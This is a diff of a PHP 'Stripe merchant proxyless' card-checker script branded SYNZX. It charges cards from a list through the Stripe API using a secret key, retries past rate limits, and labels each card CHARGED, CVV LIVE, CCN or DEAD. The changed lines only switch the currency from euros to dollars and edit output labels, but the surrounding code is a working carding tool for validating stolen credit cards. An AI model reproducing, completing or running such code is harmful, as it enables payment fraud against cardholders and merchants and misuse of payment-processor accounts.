@@ -1,8 +1,7 @@
 <?php
 
 
-//===================== [ MADE BY checker ] ====================//
-#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#
+
 
 
 
@@ -94,8 +93,6 @@ if (strpos($result1, "rate_limit"))
 break;  
 
 }
-//echo "<br><b>Result1: </b> $result1<br>";
-
 #-------------------[2nd REQ]--------------------#
 
 $x = 0;  
@@ -118,7 +115,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=eur&payment_method_types[]=card&description=SYNZX Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=SYNZX Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
 
 $result2 = curl_exec($ch);  
 
@@ -144,14 +141,10 @@ break;
 
 
 
-
 //=================== [ RESPONSES ] ===================//
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
-   
-    
-   
-    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: €'.$amt.' 𝗖𝗩𝗩 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅ 𝗕𝗬 𝗦𝗬𝗡𝗭𝗫  <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' 𝗖𝗩𝗩 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅ 𝗕𝗬 𝗦𝗬𝗡𝗭𝗫  <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 𝗖𝗩𝗩 𝗟𝗜𝗩𝗘</span><br>';
@@ -183,10 +176,10 @@ elseif(strpos($result,"fraudulent")){
 }
 
 elseif(strpos($result2,'"code": "incorrect_cvc"')){
-    echo '𝘾𝘾𝙉</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
 }
 elseif(strpos($result1,' "code": "invalid_cvc"')){
-    echo '𝘾𝘾𝙉</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
      
 }
 elseif(strpos($result1,"invalid_expiry_month")){
@@ -233,7 +226,7 @@ elseif(strpos($result2, "transaction_not_allowed" )) {
     	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
    } 
 elseif(strpos($result2, "incorrect_cvc" )) {
-    echo '𝘾𝘾𝙉</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
 }
 elseif(strpos($result2, "pickup_card" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
@@ -326,7 +319,7 @@ elseif (strpos($result,'Your card does not support this type of purchase.')) {
     }
 
 elseif(strpos($result2,'"cvc_check": "pass"')){
-    echo 'CVV</span>  </span>:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
 }
 elseif(strpos($result2, "fraudulent" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
@@ -353,14 +346,13 @@ else {
 
 
 
-
-
 //echo "<br><b>Lista:</b> $lista<br>";
 //echo "<br><b>CVV Check:</b> $cvccheck<br>";
 //echo "<b>D_Code:</b> $dcode<br>";
 //echo "<b>Reason:</b> $reason<br>";
 //echo "<b>Risk Level:</b> $riskl<br>";
 //echo "<b>Seller Message:</b> $seller_msg<br>";
+
 echo " BYPASSING: $x <br>";
 
 //echo "<br><b>Result3: </b> $result2<br>";
